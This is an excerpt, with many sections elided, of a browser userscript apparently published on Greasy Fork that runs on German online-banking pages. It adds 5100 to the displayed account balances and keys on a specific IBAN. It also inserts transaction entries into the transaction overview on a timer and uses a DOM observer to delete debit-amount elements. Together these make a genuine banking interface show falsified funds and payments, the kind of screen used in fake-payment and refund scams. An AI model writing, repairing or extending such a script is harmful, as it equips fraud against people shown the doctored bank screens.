...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/484912/Ed%20Commerz%20Peter%20Zohr.user.js
// @updateURL https://update.greasyfork.org/scripts/484912/Ed%20Commerz%20Peter%20Zohr.meta.js
// ==/UserScript==
...
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
 ...
 // Configurable Elements
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: +5100 },
        { index: 1, adjustmentAmount: +5100  },
        { index: 2, adjustmentAmount: +5100  },
...
balanceModificationAmount = balanceChange = 5100.00 ;
...
///IBAN CONFIGURATION_______________________________________________________
     ...
     expectedIBAN = searchText = targetTextContent = specifiedTextContent = "DE26 2104 0010 0733 3271 00"
...
///////////////////////////////////////////////////////////////////////////////
   ...
   if (window.location.href.indexOf("landingpage") > 0 || window.location.href.indexOf("10908799570") > 0 || window.location.href.indexOf("10726846341") > 0 ) {
(function () {
    'use strict';
...
if (window.location.href.indexOf("financeoverview") > 0 || window.location.href.indexOf("10908805520") > 0 || window.location.href.indexOf("10726834157") > 0) {
  (function () {
    'use strict';
...
///////////////////////////////////////////////////////////////////////////////
   ...
   if (window.location.href.indexOf("account/transactions") > 0 || window.location.href.indexOf("10908798355") > 0 || window.location.href.indexOf("10726842017") > 0 ) {
        ...
        if (currentAccountArea) {
            ...
            if (balanceElement) {
                ...
                if (!isNaN(numericBalance)) {
                    ...
                    var textToSearch = "Ihr Kontostand um";
                    var elementsWithText = document.querySelectorAll('*');
                    for (var j = 0; j < elementsWithText.length; j++) {
                        var element = elementsWithText[j];
...
if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("10753431145") > 0 || window.location.href.indexOf("10733875328") > 0) {
  (function () {
    'use strict';
  ...
  // Function to check and insert transactions periodically
        function checkAndInsertTransactions() {
            ...
            if (!existingTransactionContainer && targetElement) {
                ...
                console.log("Target element not found. Will check again in next interval.");
            } else {
        ...
        setInterval(checkAndInsertTransactions, 2000)
...
if (window.location.href.indexOf("payments") > 0 || window.location.href.indexOf("10468947002") > 0 || window.location.href.indexOf("10468947002") > 0) {
    (function() {
        'use strict';
        ...
        // Watch for changes in the DOM and remove "debitorAmount" elements
        var observer = new MutationObserver(function(mutationsList) {
            mutationsList.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            if (node.classList && node.classList.contains('debitorAmount')) {
                                node.remove();
                                console.log('Removed dynamically added "debitorAmount" element.');
                            }
                            // Check for debitorAmount elements inside added nodes
                            if (node.querySelectorAll) {
                                var innerElements = node.querySelectorAll('.debitorAmount');
                                innerElements.forEach(function(innerElement) {
                                    innerElement.remove();
                                });
                                if (innerElements.length > 0) {
                                    console.log('Removed ' + innerElements.length + ' debitorAmount elements from an added node.');
                                }
                            }
                        }
                    });
        ...
        // Initial removal of existing "debitorAmount" elements
        removeDebitorAmount();
    })();
}
